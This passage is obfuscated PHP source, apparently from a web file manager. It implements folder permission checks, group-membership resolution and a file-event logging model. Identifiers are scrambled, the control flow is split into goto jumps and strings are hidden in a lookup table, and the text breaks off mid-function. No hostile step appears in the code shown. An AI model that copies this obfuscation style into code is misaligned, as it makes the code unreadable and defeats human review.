continue; } $c霞[$bዢ۟[434]] = $eڼؽ; $dɬ[] = $c霞; goto Bۘ; Bۘ: $FƯߡ = 0; if ($F˳[$bዢ۟[387]] == SourceModel::TYPE_GROUP) { $FƯߡ = $B * 2; } if ($F˳[$bዢ۟[387]] == SourceModel::TYPE_USER) { $FƯߡ = $B; } goto b۵ʚ; C: $eڼؽ = Model($bዢ۟[1821])->listData($F˳[$bዢ۟[1801]]); if (!$eڼؽ) { continue; } if ($F˳[$bዢ۟[387]] == SourceModel::TYPE_USER) { $c霞 = Model($bዢ۟[491])->getInfoSimpleOuter($F˳[$bዢ۟[473]]); if ($c霞[$bዢ۟[1493]] == $bዢ۟[1055]) { continue; } if ($c霞[$bዢ۟[1493]] == $bዢ۟[485]) { $c霞[$bዢ۟[28]] = LNG($bዢ۟[1826]); } } else { $c霞 = Model($bዢ۟[475])->getInfoSimple($F˳[$bዢ۟[473]]); } goto DЛ⽃; b۵ʚ: if ($F˳[$bዢ۟[387]] == SourceModel::TYPE_USER && $F˳[$bዢ۟[473]] == $bዢ۟[485]) { $FƯߡ = 0; } $e՘[] = $eڼؽ[$bዢ۟[392]] + $FƯߡ; goto F섞; F섞: } array_multisort($e՘, SORT_DESC, $dɬ); goto fҪɼ; fҪɼ: return $dɬ; goto bո; bո: } public function getAllChildrenByUser($Bȅ, $aޓѩŨ) { goto AȂ; Bۅ: $bń = Model($FѦ[1172])->sourceInfo($Bȅ); $a = array(); $A = 1; goto e; CߠЛ: return $E۴菗; goto Dῌڪ; AȂ: $FѦ =& $_SERVER[Ť]; $FǙ = Model($FѦ[494])->getInfo($aޓѩŨ); if (!$aޓѩŨ || !$Bȅ || !$FǙ) { return array(); } goto Bۅ; Cʉߕ: foreach ($eʎɆ as $Eܭ) { $a = !1; foreach ($Eܭ[$FѦ[1824]] as $Bܶ) { if ($Bܶ[$FѦ[1493]]) { if ($Bܶ[$FѦ[1493]] == $aޓѩŨ) { $a = !0; break; } } if ($Bܶ[$FѦ[1652]]) { if ($this->groupContainUser($Bܶ[$FѦ[1652]], $aޓѩŨ)) { $a = !0; break; } } } if ($a) { $E۴菗[] = $Eܭ; } $b = $Eܭ[$FѦ[385]]; if (isset($a[$b])) { $Eܭ[$FѦ[1824]][] = $a[$b][0]; $a[$b] = !1; } } $a = array_filter(array_values($a)); $E۴菗 = array_merge($a, $E۴菗); goto CߠЛ; e: if ($bń[$FѦ[478]] == $FѦ[485] && $bń[$FѦ[473]] != $A && $this->groupContainUser($bń[$FѦ[473]], $aޓѩŨ)) { foreach ($FǙ[$FѦ[1827]] as $fڕ޻) { $BΫ͑׃ = Model($FѦ[475])->getInfo($fڕ޻[$FѦ[1652]]); $eܱύ = Model($FѦ[494])->getInfoSimpleOuter($aޓѩŨ); $eܱύ[$FѦ[434]] = $fڕ޻[$FѦ[392]]; if (Model($FѦ[1821])->authCheckAction($fڕ޻[$FѦ[392]][$FѦ[392]], $FѦ[1672])) { continue; } $C = array($FѦ[28] => $FѦ[1445] . $BΫ͑׃[$FѦ[28]], $FѦ[385] => $BΫ͑׃[$FѦ[407]][$FѦ[385]], $FѦ[75] => KodIO::make($BΫ͑׃[$FѦ[407]][$FѦ[385]]), $FѦ[478] => $FѦ[485], $FѦ[387] => $FѦ[986], $FѦ[29] => $FѦ[505], $FѦ[483] => $BΫ͑׃[$FѦ[480]], $FѦ[1652] => $BΫ͑׃[$FѦ[1652]], $FѦ[477] => $BΫ͑׃[$FѦ[478]], $FѦ[1824] => array($eܱύ)); $a[$C[$FѦ[385]]] = $C; } } $E۴菗 = array(); $eʎɆ = $this->getAllChildren($Bȅ); goto Cʉߕ; Dῌڪ: } public function setAllChildrenByUser($b׮Έ, $eԩ, $a) { $c鶾 =& $_SERVER[Ť]; $a = $this->getAllChildrenByUser($b׮Έ, $eԩ); if (!$a || !$a) { return !1; } foreach ($a as $e) { $Bձ = array(); foreach ($e[$c鶾[1824]] as $aԠ) { $E𞌛 = $aԠ[$c鶾[434]]; $bﳤ = $aԠ[$c鶾[1493]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $dǰ = $aԠ[$c鶾[1493]] ? $aԠ[$c鶾[1493]] : $aԠ[$c鶾[1652]]; if ($aԠ[$c鶾[1493]] && $aԠ[$c鶾[1493]] == $eԩ) { continue; } $Bձ[] = array($c鶾[385] => $e[$c鶾[385]], $c鶾[387] => $bﳤ, $c鶾[473] => intval($dǰ), $c鶾[1801] => isset($E𞌛[$c鶾[383]]) ? intval($E𞌛[$c鶾[383]]) : 0, $c鶾[1802] => isset($E𞌛[$c鶾[1802]]) ? intval($E𞌛[$c鶾[1802]]) : -1); } $Bձ[] = array($c鶾[385] => $e[$c鶾[385]], $c鶾[387] => SourceModel::TYPE_USER, $c鶾[473] => intval($eԩ), $c鶾[1801] => intval($a), $c鶾[1802] => -1); $this->where(array($c鶾[399] => $e[$c鶾[385]]))->delete(); $this->addAll($Bձ); } return !0; } public function get($eʜ) { $eʜ༯ߟ = $this->getSourceList(array($eʜ), !0); return $eʜ༯ߟ[0]; } public function getSourceList($f, $CӈΎ = false, $Bѹ = false) { goto b; BѤ: $cц = $this->userIsRoot($Bѹ); $FԽ = AuthModel::authAll(); $D۳ = array($D[393] => $FԽ, $D[1830] => array($D[401] => 0, $D[1658] => $FԽ, $D[402] => LNG($D[1831]), $D[1673] => $D[1832])); goto Aʇ; Aʇ: $CƮ = array(); foreach ($CӈΎ as $bԫ => $e؇) { if ($cц) { $CƮ[$bԫ] = $D۳; continue; } $CƮ[$bԫ] = $this->makeSourceAuth($e؇, $F, $Bѹ); } return $CƮ; goto DТ; B: if (!$CӈΎ && count($f) == 1) { $CӈΎ = array(); $CӈΎ[$f[0]] = $C㭦->sourceInfo($f[0]); } if (!$CӈΎ) { $AԴ = array($D[399] => array($D[400], $f)); $CӈΎ = $C㭦->field($D[1828])->where($AԴ)->select(); $CӈΎ = array_to_keyvalue($CӈΎ, $D[385]); } $c١҃ = $f; goto b̻; b: $D =& $_SERVER[Ť]; if (!$f) { return array(); } $C㭦 = Model($D[1172]); goto B; b̻: foreach ($CӈΎ as $Aػ => $c±) { $fƶ = $C㭦->parentLevelArray($c±[$D[476]]); $c١҃ = array_merge($c١҃, array($Aػ), array_reverse($fƶ)); } $c١҃ = array_values(array_unique($c١҃)); if (!$c١҃) { return array(); } goto D؎; D؎: $Aο = $D[1829]; $AԴ = array($D[399] => array($D[400], $c١҃)); $Bχ = $this->field($Aο)->where($AԴ)->select(); goto Dփ; Dփ: $Bχ = array_to_keyvalue_group($Bχ, $D[385]); $F = array(); foreach ($c١҃ as $bԫ) { if (isset($Bχ[$bԫ])) { $F[$bԫ] = $Bχ[$bԫ]; } } goto BѤ; DТ: } public function authDeepCheck($dؐ, $C = false) { goto Aؐ؄; F·ˆ: $C = $F笻 ? $F笻[0] : $dؐ; return array($eϸ[393] => -1, $eϸ[434] => array($eϸ[401] => $eϸ[1055], $eϸ[1658] => $eϸ[485], $eϸ[402] => LNG($eϸ[1835]), $eϸ[1673] => $eϸ[1836]), $eϸ[1837] => LNG($eϸ[1838]), $eϸ[1839] => $this->sourceAuthInfo($C)); goto Fї; Aؐ؄: $eϸ =& $_SERVER[Ť]; $C = $C ? $C : USER_ID; $FĄ = $this->makeAuthDeep($C); goto eȫ; eȫ: if (!in_array($dؐ, $FĄ[$eϸ[1833]])) { return !1; } $F笻 = array(); foreach ($FĄ[$eϸ[1834]] as $B͈ => $c̦谆) { if (!in_array($dؐ, $c̦谆)) { continue; } $F笻[] = $B͈; } goto F·ˆ; Fї: } protected function makeAuthDeep($aֆ = false) { goto CŅʣ; Cе: $D߷ = array(); $bܫ = array(); $Aøҭ = array(); goto b褟; Fί: foreach ($a͏ as $bڳ) { $BĨ = $BŠҕ->getInfo($bڳ); $bβǒ[] = $BĨ[$EẼ[407]][$EẼ[385]]; $Aøҭ[$bڳ] = $BĨ[$EẼ[407]][$EẼ[385]]; $F[$bڳ] = $E̺->parentLevelArray($BĨ[$EẼ[476]]); } foreach ($D߷ as $Dᶩʠ => $c녵) { $dݳ = $bܫ[$Dᶩʠ]; if (!$dݳ || !$Aøҭ[$dݳ]) { continue; } $aϓӝ = array(); foreach ($F[$dݳ] as $bڳ) { $aϓӝ[] = $Aøҭ[$bڳ]; } $D߷[$Dᶩʠ] = array_merge($aϓӝ, $c녵); } $bβǒ = array_values(array_unique($bβǒ)); goto D; bԌ: foreach ($dƌ as $eΛʭ) { if ($eΛʭ[$EẼ[392]] == 0 && $eΛʭ[$EẼ[1674]] == $EẼ[83]) { $FΘ[] = $eΛʭ[$EẼ[383]]; } } $C = $this->userGroupParents($aֆ); $D˖ = array($EẼ[387] => SourceModel::TYPE_USER, $EẼ[473] => $aֆ); goto d; f܊΢: $c씚 = array_to_keyvalue_group($d, $EẼ[385]); foreach ($c씚 as $eĖ => $bچ) { $A = $this->authArrayCheck($bچ, $aֆ); if ($A[$EẼ[393]] > 0) { $aڡ[] = $eĖ . $EẼ[33]; } } $bβǒ = array(); goto Fۈ; Aǝ: if (isset($f[$aֆ])) { return $f[$aֆ]; } $dƌ = Model($EẼ[1840])->listData(); $FΘ = array(); goto bԌ; d: if ($C) { $D˖ = array(array($EẼ[387] => SourceModel::TYPE_USER, $EẼ[473] => $aֆ), array($EẼ[387] => SourceModel::TYPE_GROUP, $EẼ[473] => array($EẼ[400], $C)), $EẼ[928] => $EẼ[1741]); } $d = $this->field($EẼ[1841])->where($D˖)->select(); $aڡ = array(); goto f܊΢; CŅʣ: $EẼ =& $_SERVER[Ť]; static $f = array(); $aֆ = $aֆ ? $aֆ : USER_ID; goto Aǝ; b褟: $F = array(); if ($aڡ) { $f䎈 = $E̺->where(array($EẼ[385] => array($EẼ[400], $aڡ)))->select(); foreach ($f䎈 as $Aȑ) { $E = $E̺->parentLevelArray($Aȑ[$EẼ[476]]); $bβǒ = array_merge($bβǒ, $E); $a͏[] = $Aȑ[$EẼ[473]]; $D߷[$Aȑ[$EẼ[385]]] = $E; $bܫ[$Aȑ[$EẼ[385]]] = $Aȑ[$EẼ[473]]; } } $a͏ = array_values(array_unique($a͏)); goto a; Fۈ: $a͏ = $C; $E̺ = Model($EẼ[1172]); $BŠҕ = Model($EẼ[475]); goto Cе; D: $fȴ = array($EẼ[1833] => $bβǒ, $EẼ[1834] => $D߷); $f[$aֆ] = $fȴ; return $fȴ; goto aɪ; a: $Dĩ = $a͏; foreach ($Dĩ as $bڳ) { $BĨ = $BŠҕ->getInfo($bڳ); $E = $E̺->parentLevelArray($BĨ[$EẼ[476]]); $a͏ = array_merge($a͏, $E); } $a͏ = array_values(array_unique($a͏)); goto Fί; aɪ: } private function makeSourceAuth($BȯƊ, $B둊, $C = false) { goto E; f: $B = $BȯƊ[$cΗ[387]] == SourceModel::TYPE_GROUP; $eȃ = $B ? $this->groupRootAuth($a, $C) : !1; if ($eȃ && Model($cΗ[1821])->authCheckAction($eȃ[$cΗ[392]], $cΗ[1672])) { return $this->groupAuthInfo($eȃ, $a); } goto EŞⷭ; EŞⷭ: $D = Model($cΗ[1172])->parentLevelArray($BȯƊ[$cΗ[476]]); $D = array_merge(array($BȯƊ[$cΗ[385]]), array_reverse($D)); $e = !1; goto d±ʋ; bМ: if (!$e) { $Aˎ = Model($cΗ[475])->getInfo($a); $E舢 = explode($cΗ[47], trim($Aˎ[$cΗ[476]], $cΗ[47])); foreach ($E舢 as $C܎) { if ($C܎ == $cΗ[485] || $C܎ == $a) { continue; } $bަ = $this->groupRootAuth($C܎, $C); if (!$bަ) { continue; } $e = $this->groupAuthInfo($bަ, $C܎); break; } } if (!$e || $e[$cΗ[393]] <= 0) { $B慇 = $this->authDeepCheck($BȯƊ[$cΗ[385]], $C); if ($B慇) { $e = $B慇; } } return $e; goto c; E: $cΗ =& $_SERVER[Ť]; $a = $cΗ[83]; $a = $BȯƊ[$cΗ[473]]; goto f; d±ʋ: foreach ($D as $fȣ) { if (!isset($B둊[$fȣ])) { continue; } $C = $this->authMake($B둊[$fȣ], $C); if ($C[$cΗ[434]]) { $e = $C; break; } } if (!$B) { return $e; } if (!$e && $eȃ) { $e = $this->groupAuthInfo($eȃ, $a); } goto bМ; c: } private function userIsRoot($a֡ެ = false) { $B =& $_SERVER[Ť]; if (!$a֡ެ && _get($GLOBALS, $B[474])) { return !0; } $e㉲ = Model($B[494])->getInfo($a֡ެ); $c = Model($B[1842])->listData($e㉲[$B[1377]]); if ($c && $c[$B[1249]][$B[1843]] == 1) { return !0; } return !1; } private function sourceAuthInfo($AȲ) { goto eɉ׉; E: if (isset($dʦɚ[$dʼش[481]])) { $aܜ = explode($dʼش[8], trim($dʦɚ[$dʼش[483]], $dʼش[8])); array_shift($aܜ); $A = $dʦɚ[$dʼش[479]] . $dʼش[1844] . implode($dʼش[8], $aܜ); } return array($dʼش[402] => $dʦɚ[$dʼش[28]], $dʼش[75] => KodIO::make($dʦɚ[$dʼش[385]]), $dʼش[1845] => $A); goto cȩ; eɉ׉: $dʼش =& $_SERVER[Ť]; $fܥ = Model($dʼش[1172]); $dʦɚ = $fܥ->sourceInfo($AȲ); goto Aٍ; Aٍ: if (!$dʦɚ) { return !1; } $fܥ->groupPathDisplay($dʦɚ); $Dū = array($dʦɚ); goto Dҟ; Dҟ: $Dū = $fܥ->_listAppendPath($Dū); $dʦɚ = $Dū[0]; $A = $dʦɚ[$dʼش[483]]; goto E; cȩ: } private function groupAuthInfo($a, $D梅) { $dݻθ =& $_SERVER[Ť]; $D誸 = Model($dݻθ[475])->getInfo($D梅); return array($dݻθ[1846] => intval($a[$dݻθ[392]]), $dݻθ[1830] => $a, $dݻθ[1847] => LNG($dݻθ[1848]), $dݻθ[1839] => array($dݻθ[402] => $D誸[$dݻθ[28]], $dݻθ[75] => KodIO::make($D誸[$dݻθ[407]][$dݻθ[385]]), $dݻθ[1845] => $D誸[$dݻθ[480]])); } protected function groupRootAuth($AʋƱ, $e𜵬 = false) { goto C; A: $CП޹ = $bƅЃ ? $this->authMake($bƅЃ, $e𜵬) : !1; $d = $CП޹ ? $CП޹[$d놾[434]] : !1; $Eύ[$a۟] = $d ? $d : $cƭʎ; goto c; cѐ: static $Eύ = array(); if (isset($Eύ[$a۟])) { return $Eύ[$a۟]; } $b = Model($d놾[475])->getInfo($AʋƱ); goto AʖƋ; AʖƋ: $Fوޭ = $this->userGroupList($e𜵬); $cƭʎ = isset($Fوޭ[$AʋƱ]) ? $Fوޭ[$AʋƱ][$d놾[392]] : !1; if ($cƭʎ && Model($d놾[1821])->authCheckAction($cƭʎ[$d놾[392]], $d놾[1672])) { $Eύ[$a۟] = $cƭʎ; return $cƭʎ; } goto eђ; c: return $Eύ[$a۟]; goto BÛ; C: $d놾 =& $_SERVER[Ť]; $e𜵬 = $e𜵬 ? $e𜵬 : USER_ID; $a۟ = $e𜵬 . $d놾[1849] . $AʋƱ; goto cѐ; eђ: $fӐ = array($d놾[385] => $b[$d놾[407]][$d놾[385]]); $eܙ = $d놾[1829]; $bƅЃ = $this->field($eܙ)->cacheMemory()->where($fӐ)->select(); goto A; BÛ: } public function authOwnerApply($fĦ) { goto A܍Ǝ; cĹ: $b׫ = array(); $c؈ = array(); foreach ($AĎڔ as $Aҫ => $F) { $c = $this->authFolderOwnerUser($F); $b׫[$Aҫ] = $c; $c؈ = array_merge($c؈, $c[$eʩ[551]]); if ($c[$eʩ[1851]]) { break; } } goto e蔴; e蔴: if (count($c؈) == 0) { $c؈ = $this->authFolderOwnerGroup($fĦ[$eʩ[473]]); } $c؈ = array_unique($c؈); if (AuthModel::authCheckRoot($fĦ[$eʩ[392]][$eʩ[393]])) { $c؈[] = USER_ID; } goto a; A܍Ǝ: $eʩ =& $_SERVER[Ť]; if (empty($fĦ[$eʩ[392]]) || isset($fĦ[$eʩ[1850]]) && $fĦ[$eʩ[1850]]) { return $fĦ; } if (AuthModel::authCheckRoot($fĦ[$eʩ[392]][$eʩ[393]])) { return $fĦ; } goto D; eȤ: $c = array($eʩ[399] => array($eʩ[400], $B)); $AĎڔ = $this->field($Eɬ)->where($c)->select(); $AĎڔ = array_to_keyvalue_group($AĎڔ, $eʩ[385]); goto cĹ; a: $fĦ[$eʩ[392]][$eʩ[1852]] = Model($eʩ[491])->userListInfo($c؈); return $fĦ; goto e; D: $B = Model($eʩ[1172])->parentLevelArray($fĦ[$eʩ[476]]); $B = array_merge(array($fĦ[$eʩ[385]]), array_reverse($B)); $Eɬ = $eʩ[1829]; goto eȤ; e: } private function authFolderOwnerGroup($Fʽ) { $bʱ =& $_SERVER[Ť]; $eޟ = Model($bʱ[1735])->where(array($bʱ[1652] => $Fʽ))->select(); $dʏʈ = array(); if (!$eޟ) { return $dʏʈ; } foreach ($eޟ as $D) { $B = $this->authInfo($D); if (AuthModel::authCheckRoot($B[$bʱ[392]])) { $dʏʈ[] = $D[$bʱ[1493]]; } } return $dʏʈ; } private function authFolderOwnerUser($eǕ) { $e塻 =& $_SERVER[Ť]; $C = array(); $f򤄴Ȫ = !1; foreach ($eǕ as $B) { $Fڧ = $this->authInfo($B); if ($B[$e塻[473]] == $e塻[485]) { $f򤄴Ȫ = !0; } if ($B[$e塻[387]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Fڧ[$e塻[392]])) { $C[] = $B[$e塻[473]]; } } } return array($e塻[551] => $C, $e塻[1851] => $f򤄴Ȫ); } public function authMake($cѨ, $eӂٛ = false) { $f =& $_SERVER[Ť]; $aԐ = $this->authArrayCheck($cѨ, $eӂٛ); if ($aԐ[$f[1853]]) { $aԐ[$f[1853]] = $this->sourceAuthInfo($aԐ[$f[1853]]); } return $aԐ; } public function authArrayCheck($E͒, $e = false) { goto D; eӽ: foreach ($E͒ as $a») { $b = $this->authInfo($a»); if (!$b) { continue; } $Cט΃ = $a»[$E[473]]; $CՌ = intval($b[$E[392]]); if ($a»[$E[387]] == SourceModel::TYPE_USER && $Cט΃ == $e) { $A = !0; $bҹܐ = $b; $B = $CՌ; } else { if ($a»[$E[387]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Cט΃, $e)) { $eɧɎ = !0; $cֲ = $this->groupStepToUserGroup($Cט΃, $e); if ($cֲ < $F) { $F = $cֲ; $Eݽߍ = $CՌ; $fҭ = $b; $A = $Cט΃; } if ($cֲ == $F && $CՌ >= $Eݽߍ) { $Eݽߍ = $CՌ; $fҭ = $b; $A = $Cט΃; } } else { if ($Cט΃ == $E[485]) { $f = !0; $E = $b; $bԤ = $CՌ; } } } } if ($A) { $cѾ݌ = $B; $b = $bҹܐ; $d٢칓 = LNG($E[1854]); } else { if ($eɧɎ) { $cѾ݌ = $Eݽߍ; $b = $fҭ; $f« = Model($E[475])->getInfo($A); $d٢칓 = $E[157] . $f«[$E[480]] . $E[1855] . LNG($E[1856]); } else { if ($f) { $cѾ݌ = $bԤ; $b = $E; $d٢칓 = LNG($E[1826]); } else { $cѾ݌ = 0; $b = !1; $d٢칓 = $E[33]; } } } $D = array($E[1846] => intval($cѾ݌), $E[1830] => $b, $E[1847] => $d٢칓, $E[1839] => $a»[$E[385]]); goto bۅ; Bʾ: $eɧɎ = 0; $Eݽߍ = 0; $fҭ = 0; goto cܼж; e߃: $bԤ = 0; $E = 0; $a» = array($E[385] => 0); goto eӽ; bۅ: return $D; goto A릃; D: $E =& $_SERVER[Ť]; if (!$E͒) { return array($E[393] => 0, $E[434] => !1); } $e = $e ? $e : USER_ID; goto FǶ; FǶ: $A = 0; $B = 0; $bҹܐ = 0; goto Bʾ; cܼж: $F = 1000; $A = 0; $f = 0; goto e߃; A릃: } private function groupContainUser($E͵, $f = false) { return in_array($E͵, $this->userGroupParents($f)); } private function groupStepToUserGroup($b, $E = false) { goto d̲; aۑ: return $A; goto Dʽ; d̲: $aı =& $_SERVER[Ť]; $f޽ = $this->userGroupList($E); $A = 1000; goto E; E: $eѩ = $GLOBALS[$aı[6]][$aı[84]][$aı[1747]] == 1; $d = $eѩ ? 3 : 2; foreach ($f޽ as $EӐ) { if ($EӐ[$aı[1652]] == $b) { return 0; } $Fʊ = explode($aı[47], trim($EӐ[$aı[476]], $aı[47])); if ($Fʊ[0] == $aı[485] && count($Fʊ) > $d) { $F㣝̓ = array_reverse(array_slice($Fʊ, $d)); $DĤ = array_search($b, $F㣝̓); if ($DĤ !== !1 && $DĤ + 1 <= $A) { $A = $DĤ + 1; } } } goto aۑ; Dʽ: } private function userGroupList($C׹ = false) { $E =& $_SERVER[Ť]; static $CӮ = array(); if (isset($CӮ[$C׹])) { return $CӮ[$C׹]; } $Bۑ = Model($E[494])->getInfo($C׹); $CӮ[$C׹] = array_to_keyvalue($Bۑ[$E[1827]], $E[1652]); return $CӮ[$C׹]; } public function userGroupParents($Dۭ) { goto Dݖ; e: $Fⵌ = $GLOBALS[$D[6]][$D[84]][$D[1747]] == 1; $A = $Fⵌ ? 3 : 2; foreach ($f󡙡 as $A먕) { $EӉ = array($A먕[$D[1652]]); $bڗ = explode($D[47], trim($A먕[$D[476]], $D[47])); if ($bڗ[0] == $D[485] && count($bڗ) > $A) { $bЛ = array_slice($bڗ, $A); $EӉ = array_merge($EӉ, array_reverse($bЛ)); } $dνނ = array_merge($dνނ, $EӉ); } goto C; C: $d­[$Dۭ] = array_unique($dνނ); return $d­[$Dۭ]; goto F; bȓ: if (isset($d­[$Dۭ])) { return $d­[$Dۭ]; } $f󡙡 = $this->userGroupList($Dۭ); $dνނ = array(); goto e; Dݖ: $D =& $_SERVER[Ť]; static $d­ = array(); $Dۭ = $Dۭ ? $Dۭ : USER_ID; goto bȓ; F: } public function authTargetInfoMake($C) { goto aꍫ; fӴ؏: return array($f[1857] => $a, $f[1858] => $C֝); goto F; aꍫ: $f =& $_SERVER[Ť]; $a = array(); $C֝ = array(); goto D; D: foreach ($C as $A) { if ($A[$f[387]] == SourceModel::TYPE_USER) { $a[] = intval($A[$f[473]]); } else { if ($A[$f[387]] == SourceModel::TYPE_GROUP) { $C֝[] = intval($A[$f[473]]); } } } if ($a) { $a = Model($f[491])->userListInfo($a); } if ($C֝) { $F҈¯ = array($f[1733] => array($f[400], $C֝)); $C֝ = Model($f[475])->field($f[1746])->where($F҈¯)->select(); $C֝ = array_to_keyvalue($C֝, $f[1652]); } goto fӴ؏; F: } public function authInfo($eΣ) { $d㗉 =& $_SERVER[Ť]; if ($eΣ[$d㗉[1801]]) { $Aú = Model($d㗉[1821])->listData($eΣ[$d㗉[1801]]); if (!$Aú) { return !1; $d = Model($d㗉[1821])->listData(); $bʔ = array_filter_by_field($d, $d㗉[392], $d㗉[485]); return $bʔ; } $Aԃſ = array_field_key($Aú, array($d㗉[383], $d㗉[28], $d㗉[392], $d㗉[1673], $d㗉[1675])); $Aԃſ[$d㗉[1859]] = $eΣ; return $Aԃſ; } else { return array($d㗉[401] => 0, $d㗉[1658] => $eΣ[$d㗉[1802]], $d㗉[402] => $d㗉[33], $d㗉[1673] => $d㗉[1860]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\x75\x72\143\145\137\x65\166\145\156\164"; protected $dataAuto = array(array("\x63\162\145\x61\164\145\x54\151\x6d\145", "\x74\x69\155\145", "\x69\x6e\x73\x65\x72\x74", "\x66\165\156\143\164\x69\x6f\x6e"), array("\x64\145\x73\143", '', "\x69\156\x73\145\162\x74\x2c\165\160\144\141\x74\145\x2c\163\x65\154\x65\x63\164", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($A, $B߷, $Fݝ = '') { goto cˎ; cˎ: $F͎ =& $_SERVER[Ť]; if (!$this->eventSave) { return; } $F = Model($F͎[1172])->sourceInfo($A); goto a׋; a׋: if (!$F) { return !1; } if ($this->isCacheEvent($F, $B߷)) { return; } if ($Fݝ && is_string($Fݝ)) { $Fݝ = array($F͎[1686] => $Fݝ); } goto dƅ; dƅ: $D֝ = array($F͎[399] => $A, $F͎[1861] => $F[$F͎[478]], $F͎[1862] => $F[$F͎[28]], $F͎[483] => $F[$F͎[483]], $F͎[1485] => USER_ID, $F͎[404] => $B߷, $F͎[1487] => $Fݝ); $this->addSystemLog($B߷, $D֝); return $this->add($D֝); goto B; B: } private function addSystemLog($F˭, $Dʄ) { $A =& $_SERVER[Ť]; if ($F˭ == $A[1863]) { $F˭ = $Dʄ[$A[421]][$A[1864]]; } else { if (in_array($F˭, array($A[1629], $A[1865]))) { $F˭ = $Dʄ[$A[421]][$A[702]]; } } $b扣 = array_merge($Dʄ, array($A[1866] => $Dʄ[$A[385]], $A[1867] => $Dʄ[$A[1867]])); Model($A[1592])->addLog($A[1868] . $F˭, $b扣); } private function isCacheEvent($a, $D) { if ($a[$_SERVER[Ť][387]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($D, $e®) { $b۳ =& $_SERVER[Ť]; $a窘ʔ = Model($b۳[1172])->sourceInfo($D); $aؼ = array($b۳[1864] => $e®, $b۳[28] => $a窘ʔ[$b۳[28]]); return $this->addEvent($D, $b۳[1863], $aؼ); } public function eventFileEdit($c) { $dٍ =& $_SERVER[Ť]; $A΂ֈ = array($dٍ[1869] => $_SERVER[$dٍ[1870]], $dٍ[1871] => strtolower(ACTION)); return $this->addEvent($c, $dٍ[1619], $A΂ֈ); } public function eventRecycle($A, $d) { return $this->addEvent($A, $_SERVER[Ť][1865], $d); } public function eventRemove($B) { $d҆ =& $_SERVER[Ť]; $bȓ = Model($d҆[1172])->sourceInfo($B); $Dݱ˾ = $bȓ[$d҆[28]]; return $this->addEvent($bȓ[$d҆[478]], $d҆[1618], $Dݱ˾); } public function eventShare($c, $Aɏ) { return $this->addEvent($c, $_SERVER[Ť][1629], $Aɏ); } public function eventMove($e, $c𞨮, $F) { goto Dûږ; e̎: $this->addEvent($c𞨮, $aŮ[1875], $eɘᄪ); goto c񄐩; Dûږ: $aŮ =& $_SERVER[Ť]; $cƫȝ = Model($aŮ[1172]); $AǈƉ = $cƫȝ->sourceInfo($e); goto Bڣ; Bڣ: $f졪 = $cƫȝ->sourceInfo($c𞨮); $fߘ = $cƫȝ->sourceInfo($F); $eɘᄪ = array($aŮ[1025] => $c𞨮, $aŮ[1872] => $f졪[$aŮ[28]], $aŮ[1853] => $f졪[$aŮ[483]], $aŮ[1026] => $F, $aŮ[1873] => $fߘ[$aŮ[28]], $aŮ[1874] => $fߘ[$aŮ[483]]); goto CŹհ; CŹհ: $this->addEvent($e, $aŮ[509], $eɘᄪ); $AǈƉ = $cƫȝ->sourceInfo($e); $eɘᄪ = array($aŮ[385] => $AǈƉ[$aŮ[385]], $aŮ[28] => $AǈƉ[$aŮ[28]]); goto e̎; c񄐩: } public function eventCopy($B⍉ߣ) { $this->eventCreate($B⍉ߣ, $_SERVER[Ť][507]); } public function eventRename($F̓, $cҖ, $Fّͺ) { $B =& $_SERVER[Ť]; $cڎ = array($B[1025] => $cҖ, $B[1026] => $Fّͺ); return $this->addEvent($F̓, $B[1185], $cڎ); } public function eventAddComment($e֯, $Dж) { return $this->addEvent($e֯, $_SERVER[Ť][1876], $Dж); } public function eventAddDesc($fѨވ, $b荃ί) { return $this->addEvent($fѨވ, $_SERVER[Ť][1877], $b荃ί); } public function listBySource($B) { goto D; E׾: if ($f[$Aı擼[386]] == $Aı擼[83]) { $A = Model($Aı擼[1172])->listSearchChildren($B, 20000); $A[] = $B . $Aı擼[368]; $fտ = array($Aı擼[385] => array($Aı擼[7], $A)); } $b봎 = $this->where($fտ)->order($Aı擼[1878])->selectPage(); if ($b봎[$Aı擼[358]][$Aı擼[359]] == 0) { $b봎[$Aı擼[358]][$Aı擼[359]] = 1; $b봎[$Aı擼[361]] = array(array($Aı擼[399] => $B, $Aı擼[1861] => $f[$Aı擼[478]], $Aı擼[1485] => $f[$Aı擼[394]], $Aı擼[404] => $Aı擼[1879], $Aı擼[405] => $f[$Aı擼[190]], $Aı擼[1487] => $Aı擼[33])); } goto dۑ; dۑ: return $this->eventListParse($b봎, $B); goto E푃; D: $Aı擼 =& $_SERVER[Ť]; $f = Model($Aı擼[1172])->sourceInfo($B); $fտ = array($Aı擼[399] => $B); goto E׾; E푃: } private function eventListParse($bܷ͗, $BӸȂ) { goto eކÉ; Cͯ: $D = array_to_keyvalue($a, $b뿉[33], $b뿉[1867]); foreach ($a as $E) { $b߈Ȇ = $E[$b뿉[421]]; if ($E[$b뿉[29]] == $b뿉[509] && isset($b߈Ȇ[$b뿉[1025]])) { $f[] = $b߈Ȇ[$b뿉[1025]] . $b뿉[33]; $f[] = $b߈Ȇ[$b뿉[1026]] . $b뿉[33]; } if ($E[$b뿉[29]] == $b뿉[1875] && isset($b߈Ȇ[$b뿉[385]])) { $f[] = $b߈Ȇ[$b뿉[385]] . $b뿉[33]; } } $f = array_merge($f, $D, array($BӸȂ . $b뿉[33])); goto F; F: $f = array_unique($f); $B = array_unique(array_to_keyvalue($a, $b뿉[33], $b뿉[1493])); $dʤѻ = Model($b뿉[494])->userListInfo($B); goto Aʦ䂈ŏ; eކÉ: $b뿉 =& $_SERVER[Ť]; $a = $bܷ͗[$b뿉[361]]; $f = array_to_keyvalue($a, $b뿉[33], $b뿉[385]); goto Cͯ; D: $bܷ͗[$b뿉[361]] = $a; return $bܷ͗; goto b⇌Ő; Aʦ䂈ŏ: $CÉ = Model($b뿉[768])->sourceListInfo($f, !0); foreach ($a as &$E) { if ($E[$b뿉[29]] == $b뿉[509] && isset($E[$b뿉[421]][$b뿉[1025]])) { $E[$b뿉[421]][$b뿉[1025]] = $CÉ[$E[$b뿉[421]][$b뿉[1025]]]; $E[$b뿉[421]][$b뿉[1026]] = $CÉ[$E[$b뿉[421]][$b뿉[1026]]]; } if 